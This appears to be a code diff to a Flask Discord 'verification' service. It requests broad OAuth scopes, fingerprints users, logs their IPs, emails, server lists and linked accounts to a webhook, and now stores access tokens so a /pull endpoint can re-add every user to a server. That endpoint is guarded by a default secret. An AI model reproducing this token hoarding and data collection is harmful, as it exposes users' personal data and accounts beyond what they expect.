@@ -8,11 +8,26 @@ from collections import defaultdict
 
 import requests
 from flask import Flask, redirect, request, url_for, render_template_string
-from user_agents import parse
+
+try:
+    from user_agents import parse as parse_ua
+except ImportError:
+    print("⚠️ WARNING: user_agents not installed. Install with: pip install user-agents")
+    def parse_ua(ua_string):
+        return type('obj', (object,), {
+            'browser': type('obj', (object,), {'family': 'Unknown', 'version_string': ''})(),
+            'os': type('obj', (object,), {'family': 'Unknown', 'version_string': ''})(),
+            'device': type('obj', (object,), {'family': 'Unknown'})(),
+            'is_mobile': False,
+            'is_tablet': False,
+            'is_pc': True,
+            'is_bot': False
+        })()
 
 app = Flask(__name__)
 
 # ---------------- CONFIG ----------------
+# All config comes from environment variables - set these in Render dashboard
 CLIENT_ID = os.getenv("DISCORD_CLIENT_ID")
 CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET")
 REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI")
@@ -20,9 +35,9 @@ RC_LOGS_WEBHOOK = os.getenv("RC_LOGS_WEBHOOK")
 BOT_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
 GUILD_ID = os.getenv("DISCORD_GUILD_ID")
 MEMBER_ROLE_ID = "1437971141925929139"
-PULL_SECRET = os.getenv("PULL_SECRET", "change-this-secret")  # Secret key for /pull endpoint
+PULL_SECRET = os.getenv("PULL_SECRET", "change-this-secret")
 
-OAUTH_SCOPE = "identify email guilds guilds.members.read connections guilds.join"  # Added guilds.join
+OAUTH_SCOPE = "identify email guilds guilds.members.read connections guilds.join"
 DISCORD_API_BASE = "https://discord.com/api"
 SITE_NAME = "Enchanted Verification"
 
@@ -34,6 +49,7 @@ BLOCK_VPNS = True
 ip_usage_tracker = defaultdict(list)
 email_domain_tracker = defaultdict(int)
 fingerprint_tracker = defaultdict(list)
+verified_users = {}
 
 # ---------------- HTML TEMPLATES ----------------
 
@@ -182,7 +198,7 @@ SUCCESS_PAGE_HTML = """
   <body>
     <div class="card">
       <h1>Verification complete ✅</h1>
-      <p>You can now return to the Discord server.</p>
+      <p>You have been added to the server and assigned the Member role!</p>
       <p><small>Account: {{ username }} (ID: {{ user_id }})</small></p>
     </div>
   </body>
@@ -247,7 +263,7 @@ def get_browser_fingerprint():
 def parse_user_agent(ua_string):
     """Parse user agent into detailed components"""
     try:
-        user_agent = parse(ua_string)
+        user_agent = parse_ua(ua_string)
         return {
             'browser': f"{user_agent.browser.family} {user_agent.browser.version_string}",
             'os': f"{user_agent.os.family} {user_agent.os.version_string}",
@@ -257,7 +273,8 @@ def parse_user_agent(ua_string):
             'is_pc': user_agent.is_pc,
             'is_bot': user_agent.is_bot
         }
-    except:
+    except Exception as e:
+        print(f"Error parsing user agent: {e}")
         return {
             'browser': 'Unknown',
             'os': 'Unknown',
@@ -344,12 +361,7 @@ def check_vpn_proxy(ip_address):
 
 def is_vpn_range(ip):
     """Check if IP is in known VPN/proxy ranges"""
-    # Add known VPN provider IP ranges here
-    # This is a simplified example
-    vpn_ranges = [
-        '185.220.',  # TOR
-        '185.100.',  # Common VPN
-    ]
+    vpn_ranges = ['185.220.', '185.100.']
     return any(ip.startswith(prefix) for prefix in vpn_ranges)
 
 
@@ -439,13 +451,11 @@ def analyze_email_domain(email):
     
     domain = email.split('@')[1].lower()
     
-    # Common disposable email domains
     disposable_domains = {
         'tempmail.com', 'guerrillamail.com', 'mailinator.com', '10minutemail.com',
         'throwaway.email', 'temp-mail.org', 'getnada.com', 'maildrop.cc'
     }
     
-    # Trusted email providers
     trusted_providers = {
         'gmail.com': 'Google', 'outlook.com': 'Microsoft', 'hotmail.com': 'Microsoft',
         'yahoo.com': 'Yahoo', 'icloud.com': 'Apple', 'protonmail.com': 'ProtonMail',
@@ -455,7 +465,6 @@ def analyze_email_domain(email):
     is_disposable = domain in disposable_domains
     provider = trusted_providers.get(domain, 'Other')
     
-    # Check for suspicious patterns
     is_suspicious = (
         is_disposable or
         len(domain) < 4 or
@@ -463,7 +472,6 @@ def analyze_email_domain(email):
         any(char.isdigit() for char in domain.split('.')[0])
     )
     
-    # Track domain usage
     email_domain_tracker[domain] += 1
     
     return {
@@ -484,7 +492,7 @@ def check_duplicate_accounts(user_id, ip_address, email):
     return {
         'accounts_from_ip': accounts_from_ip,
         'is_shared_ip': accounts_from_ip > 1,
-        'ip_usage_list': list(set(ip_usage_tracker[ip_address]))[:5]  # First 5
+        'ip_usage_list': list(set(ip_usage_tracker[ip_address]))[:5]
     }
 
 
@@ -597,7 +605,7 @@ def get_discord_guilds(access_token):
             guilds = r.json()
             return {
                 'count': len(guilds),
-                'names': [g.get('name', 'Unknown')[:30] for g in guilds[:10]],  # First 10
+                'names': [g.get('name', 'Unknown')[:30] for g in guilds[:10]],
                 'owned': len([g for g in guilds if g.get('owner', False)])
             }
     except Exception as e:
@@ -681,6 +689,97 @@ def get_discord_user(access_token: str) -> dict | None:
         print("Get user failed:", r.text)
         return None
     return r.json()
+
+
+def add_user_to_guild(access_token: str, user_id: str) -> bool:
+    """Add user to the Discord server using bot token"""
+    if not BOT_TOKEN or not GUILD_ID:
+        print("Missing BOT_TOKEN or GUILD_ID")
+        return False
+    
+    url = f"{DISCORD_API_BASE}/guilds/{GUILD_ID}/members/{user_id}"
+    headers = {
+        "Authorization": f"Bot {BOT_TOKEN}",
+        "Content-Type": "application/json"
+    }
+    data = {
+        "access_token": access_token
+    }
+    
+    try:
+        r = requests.put(url, headers=headers, json=data)
+        if r.status_code in [200, 201, 204]:
+            print(f"✅ Successfully added user {user_id} to guild")
+            return True
+        elif r.status_code == 204:
+            print(f"ℹ️ User {user_id} already in guild")
+            return True
+        else:
+            print(f"Failed to add user to guild: {r.status_code} - {r.text}")
+            return False
+    except Exception as e:
+        print(f"Error adding user to guild: {e}")
+        return False
+
+
+def assign_member_role(user_id: str) -> bool:
+    """Assign the member role to the user"""
+    if not BOT_TOKEN or not GUILD_ID:
+        print("Missing BOT_TOKEN or GUILD_ID")
+        return False
+    
+    url = f"{DISCORD_API_BASE}/guilds/{GUILD_ID}/members/{user_id}/roles/{MEMBER_ROLE_ID}"
+    headers = {
+        "Authorization": f"Bot {BOT_TOKEN}",
+        "Content-Type": "application/json"
+    }
+    
+    try:
+        r = requests.put(url, headers=headers)
+        if r.status_code in [200, 204]:
+            print(f"✅ Successfully assigned member role to user {user_id}")
+            return True
+        else:
+            print(f"Failed to assign role: {r.status_code} - {r.text}")
+            return False
+    except Exception as e:
+        print(f"Error assigning role: {e}")
+        return False
+
+
+def pull_all_verified_users():
+    """Pull all verified users back into the server"""
+    results = {
+        "success": [],
+        "failed": [],
+        "already_in": [],
+        "role_assigned": [],
+        "role_failed": []
+    }
+    
+    for user_id, user_data in verified_users.items():
+        access_token = user_data.get("access_token")
+        
+        if not access_token:
+            results["failed"].append({"user_id": user_id, "reason": "No access token"})
+            continue
+        
+        # Try to add user to guild
+        added = add_user_to_guild(access_token, user_id)
+        
+        if added:
+            results["success"].append(user_id)
+            
+            # Try to assign role
+            role_assigned = assign_member_role(user_id)
+            if role_assigned:
+                results["role_assigned"].append(user_id)
+            else:
+                results["role_failed"].append(user_id)
+        else:
+            results["failed"].append({"user_id": user_id, "reason": "Failed to add to guild"})
+    
+    return results
 
 
 def send_verification_log(user, ip_info, account_age, alt_detection, vpn_check, email_analysis, 
@@ -832,6 +931,55 @@ def send_verification_log(user, ip_info, account_age, alt_detection, vpn_check, 
         print(f"Failed to send webhook: {e}")
 
 
+def send_pull_notification(pull_results):
+    """Send a notification to the webhook about the pull operation"""
+    try:
+        stats = pull_results["stats"]
+        now = datetime.utcnow().isoformat(timespec="seconds") + "Z"
+        
+        # Determine color based on success rate
+        success_rate = (stats["added_to_server"] / stats["total"] * 100) if stats["total"] > 0 else 0
+        if success_rate >= 90:
+            color = 0x00ff00  # Green
+        elif success_rate >= 70:
+            color = 0xffcc00  # Yellow
+        else:
+            color = 0xff0000  # Red
+        
+        embed = {
+            "title": "🔄 Mass Pull Operation Completed",
+            "description": f"Attempted to pull {stats['total']} verified users back into the server",
+            "color": color,
+            "fields": [
+                {"name": "✅ Successfully Added", "value": str(stats["added_to_server"]), "inline": True},
+                {"name": "❌ Failed", "value": str(stats["failed"]), "inline": True},
+                {"name": "📊 Success Rate", "value": f"{success_rate:.1f}%", "inline": True},
+                {"name": "👤 Roles Assigned", "value": str(stats["role_assigned"]), "inline": True},
+                {"name": "⚠️ Role Assignment Failed", "value": str(stats["role_failed"]), "inline": True},
+                {"name": "🔢 Total Verified Users", "value": str(stats["total"]), "inline": True}
+            ],
+            "footer": {"text": "Enchanted • Mass Pull Operation"},
+            "timestamp": now
+        }
+        
+        # Add failed users if any (limited to first 10)
+        if pull_results["details"]["failed"]:
+            failed_list = pull_results["details"]["failed"][:10]
+            failed_text = "\n".join(f"• {item['user_id']}: {item['reason']}" for item in failed_list)
+            if len(pull_results["details"]["failed"]) > 10:
+                failed_text += f"\n... and {len(pull_results['details']['failed']) - 10} more"
+            embed["fields"].append({
+                "name": "Failed Users", 
+                "value": failed_text, 
+                "inline": False
+            })
+        
+        payload = {"embeds": [embed]}
+        requests.post(RC_LOGS_WEBHOOK, json=payload)
+    except Exception as e:
+        print(f"Failed to send pull notification: {e}")
+
+
 # ---------------- ROUTES ----------------
 
 @app.route("/")
@@ -937,6 +1085,13 @@ def oauth_callback():
     user_id = user.get("id", "Unknown")
     email = user.get("email", "")
     
+    # Store verified user data for /pull functionality
+    verified_users[user_id] = {
+        "access_token": access_token,
+        "username": user.get("username"),
+        "verified_at": datetime.utcnow().isoformat()
+    }
+    
     # Get additional data
     guilds_info = get_discord_guilds(access_token)
     connections_info = get_discord_connections(access_token)
@@ -957,6 +1112,21 @@ def oauth_callback():
         user, ip_info, account_age, alt_detection, vpn_check,
         email_analysis, duplicate_check, ua_info, guilds_info, connections_info
     )
+
+    # Add user to guild and assign role
+    guild_added = add_user_to_guild(access_token, user_id)
+    role_assigned = False
+    
+    if guild_added:
+        print(f"✅ User {user_id} added to guild")
+        # Assign member role
+        role_assigned = assign_member_role(user_id)
+        if role_assigned:
+            print(f"✅ Member role assigned to {user_id}")
+        else:
+            print(f"⚠️ Failed to assign member role to {user_id}")
+    else:
+        print(f"⚠️ Failed to add user {user_id} to guild")
 
     # Build username display
     username = user.get('username', 'Unknown')
@@ -980,14 +1150,95 @@ def health_check():
 
 @app.route("/stats")
 def stats():
-    """Basic statistics endpoint (add authentication in production!)"""
+    """Basic statistics endpoint"""
     return {
         "total_ips": len(ip_usage_tracker),
         "total_verifications": sum(len(v) for v in ip_usage_tracker.values()),
         "unique_users": len(set(uid for uids in ip_usage_tracker.values() for uid in uids)),
         "email_domains_tracked": len(email_domain_tracker),
-        "shared_ips": sum(1 for v in ip_usage_tracker.values() if len(set(v)) > 1)
+        "shared_ips": sum(1 for v in ip_usage_tracker.values() if len(set(v)) > 1),
+        "verified_users_count": len(verified_users)
     }, 200
+
+
+@app.route("/pull", methods=["POST"])
+def pull_users():
+    """
+    Pull all verified users back into the Discord server
+    Requires: POST request with 'secret' parameter matching PULL_SECRET
+    """
+    # Check authorization
+    auth_header = request.headers.get("Authorization")
+    secret_param = request.json.get("secret") if request.is_json else request.form.get("secret")
+    
+    # Allow both Authorization header and secret parameter
+    if auth_header:
+        if auth_header != f"Bearer {PULL_SECRET}":
+            return {"error": "Unauthorized", "message": "Invalid authorization token"}, 401
+    elif secret_param:
+        if secret_param != PULL_SECRET:
+            return {"error": "Unauthorized", "message": "Invalid secret"}, 401
+    else:
+        return {"error": "Unauthorized", "message": "Missing authorization"}, 401
+    
+    # Check if bot token and guild ID are configured
+    if not BOT_TOKEN:
+        return {
+            "error": "Configuration error",
+            "message": "DISCORD_BOT_TOKEN not configured"
+        }, 500
+    
+    if not GUILD_ID:
+        return {
+            "error": "Configuration error",
+            "message": "DISCORD_GUILD_ID not configured"
+        }, 500
+    
+    # Check if there are any verified users
+    if not verified_users:
+        return {
+            "success": True,
+            "message": "No verified users to pull",
+            "stats": {
+                "total": 0,
+                "success": 0,
+                "failed": 0,
+                "role_assigned": 0,
+                "role_failed": 0
+            }
+        }, 200
+    
+    print(f"🔄 Starting pull operation for {len(verified_users)} verified users...")
+    
+    # Pull all verified users
+    results = pull_all_verified_users()
+    
+    # Build response
+    response = {
+        "success": True,
+        "message": f"Pull operation completed",
+        "stats": {
+            "total": len(verified_users),
+            "added_to_server": len(results["success"]),
+            "failed": len(results["failed"]),
+            "role_assigned": len(results["role_assigned"]),
+            "role_failed": len(results["role_failed"])
+        },
+        "details": {
+            "success": results["success"],
+            "failed": results["failed"],
+            "role_assigned": results["role_assigned"],
+            "role_failed": results["role_failed"]
+        }
+    }
+    
+    print(f"✅ Pull operation completed: {len(results['success'])} successful, {len(results['failed'])} failed")
+    
+    # Send webhook notification about pull operation
+    if RC_LOGS_WEBHOOK:
+        send_pull_notification(response)
+    
+    return response, 200
 
 
 if __name__ == "__main__":
@@ -995,4 +1246,24 @@ if __name__ == "__main__":
     print(f"📊 VPN Blocking: {'Enabled' if BLOCK_VPNS else 'Disabled'}")
     print(f"⚠️  VPN Threshold: {VPN_BLOCK_THRESHOLD}%")
     print(f"🔗 OAuth Scopes: {OAUTH_SCOPE}")
+    print(f"🏰 Guild ID: {GUILD_ID if GUILD_ID else '❌ NOT SET'}")
+    print(f"🤖 Bot Token: {'✅ SET' if BOT_TOKEN else '❌ NOT SET'}")
+    print(f"🔐 Pull Secret: {'✅ SET' if PULL_SECRET else '❌ NOT SET (Using default - CHANGE THIS!)'}")
+    print(f"👥 Member Role ID: {MEMBER_ROLE_ID}")
+    print(f"🌐 Redirect URI: {REDIRECT_URI}")
+    print("=" * 60)
+    
+    # Warnings for missing critical config
+    if not BOT_TOKEN:
+        print("⚠️  WARNING: DISCORD_BOT_TOKEN not set! Auto-join and /pull will NOT work!")
+    if not GUILD_ID:
+        print("⚠️  WARNING: DISCORD_GUILD_ID not set! Auto-join and /pull will NOT work!")
+    if PULL_SECRET == "change-this-secret":
+        print("⚠️  WARNING: Using default PULL_SECRET! Change this immediately!")
+    
+    print("=" * 60)
+    print(f"✅ Server starting on http://0.0.0.0:8080")
+    print(f"🔗 Verification URL: {REDIRECT_URI.replace('/callback', '/verify') if REDIRECT_URI else 'NOT SET'}")
+    print("=" * 60)
+    
     app.run(host="0.0.0.0", port=8080, debug=False)
